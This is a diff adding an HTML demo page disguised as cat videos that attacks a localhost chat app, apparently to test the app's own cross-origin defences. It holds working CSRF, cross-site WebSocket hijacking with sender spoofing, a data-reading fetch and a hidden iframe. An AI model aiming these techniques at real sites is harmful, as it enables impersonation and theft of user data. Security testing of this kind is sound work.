@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Innocent Cat Videos</title>
+</head>
+<body>
+    <h1>Cute Cat Videos! 🐱</h1>
+    <p>Look at these adorable cats while we secretly attack your chat app...</p>
+    
+    <!-- Attack 1: Try to fetch user info via AJAX -->
+    <script>
+        console.log("🔴 ATTACK 1: Trying to steal user info via REST API");
+        fetch('http://localhost:8080/api/user')
+            .then(response => {
+                console.log("✅ REST API attack succeeded!", response);
+                return response.json();
+            })
+            .then(data => {
+                console.log("😈 Stolen user data:", data);
+                document.getElementById('stolen-info').textContent = JSON.stringify(data);
+            })
+            .catch(error => {
+                console.log("❌ REST API attack blocked:", error);
+                document.getElementById('stolen-info').textContent = "Attack blocked by browser!";
+            });
+    </script>
+    
+    <!-- Attack 2: Try to submit a form to the chat app -->
+    <div id="form-attack">
+        <h2>🔴 ATTACK 2: Form submission attack</h2>
+        <form id="evil-form" action="http://localhost:8080/some-endpoint" method="POST">
+            <input type="hidden" name="message" value="I love my ex! Please take me back! 😭">
+            <input type="hidden" name="embarrassing" value="true">
+        </form>
+        <button onclick="document.getElementById('evil-form').submit()">
+            Click for more cat videos!
+        </button>
+    </div>
+    
+    <!-- Attack 3: Try to establish WebSocket connection -->
+    <div id="websocket-attack">
+        <h2>🔴 ATTACK 3: WebSocket hijacking attempt</h2>
+        <button onclick="attemptWebSocketAttack()">Load "premium" cat videos</button>
+        <div id="websocket-result"></div>
+    </div>
+    
+    <script>
+        function attemptWebSocketAttack() {
+            console.log("🔴 ATTACK 3: Trying to hijack WebSocket connection");
+            
+            try {
+                // Try to establish WebSocket connection to victim's chat
+                const socket = new SockJS('http://localhost:8080/ws');
+                const stompClient = new StompJs.Client({
+                    webSocketFactory: () => socket,
+                    onConnect: (frame) => {
+                        console.log("😈 WebSocket connection established!");
+                        document.getElementById('websocket-result').innerHTML = 
+                            "✅ WebSocket hijacked! Could send embarrassing messages!";
+                        
+                        // Try to send embarrassing message
+                        stompClient.publish({
+                            destination: '/app/chat.sendMessage',
+                            body: JSON.stringify({
+                                content: "I miss my ex so much! Please forgive me! 💔",
+                                sender: "alice"  // Spoofing attempt
+                            })
+                        });
+                    },
+                    onDisconnect: () => {
+                        console.log("WebSocket disconnected");
+                    },
+                    onStompError: (frame) => {
+                        console.log("❌ WebSocket attack failed:", frame);
+                        document.getElementById('websocket-result').innerHTML = 
+                            "❌ WebSocket attack blocked!";
+                    }
+                });
+                
+                stompClient.activate();
+                
+            } catch (error) {
+                console.log("❌ WebSocket attack failed:", error);
+                document.getElementById('websocket-result').innerHTML = 
+                    "❌ WebSocket attack blocked by browser!";
+            }
+        }
+    </script>
+    
+    <!-- Attack 4: Auto-submitting hidden iframe -->
+    <div id="iframe-attack">
+        <h2>🔴 ATTACK 4: Hidden iframe attack</h2>
+        <iframe id="evil-iframe" style="display:none;" 
+                src="http://localhost:8080/api/user"></iframe>
+    </div>
+    
+    <div id="results">
+        <h2>Attack Results:</h2>
+        <p><strong>Stolen Info:</strong> <span id="stolen-info">Attempting...</span></p>
+    </div>
+    
+    <!-- Include STOMP for WebSocket attack -->
+    <script src="https://cdn.jsdelivr.net/npm/sockjs-client@1/dist/sockjs.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@stomp/stompjs@7/bundles/stomp.umd.min.js"></script>
+</body>
+</html> 
